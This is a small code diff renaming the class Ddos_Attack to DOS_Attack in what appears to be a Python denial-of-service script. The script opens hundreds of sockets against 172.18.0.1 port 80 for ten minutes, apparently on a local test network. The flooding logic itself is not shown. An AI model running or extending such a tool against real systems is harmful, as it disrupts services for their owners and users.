@@ -4,7 +4,7 @@ import time
 import sys
 
 
-class Ddos_Attack():
+class DOS_Attack():
     # class initialization
     def __init__(self, ip, port=80, sockets_count=200):
         self._ip = ip
@@ -49,5 +49,5 @@ if __name__ == "__main__":
     target_ip_address = "172.18.0.1"
     target_port = 80
     sockets_count = 500
-    dos = Ddos_Attack(target_ip_address, port=target_port, sockets_count=sockets_count)
+    dos = DOS_Attack(target_ip_address, port=target_port, sockets_count=sockets_count)
     dos.attack(timeout=60*10)
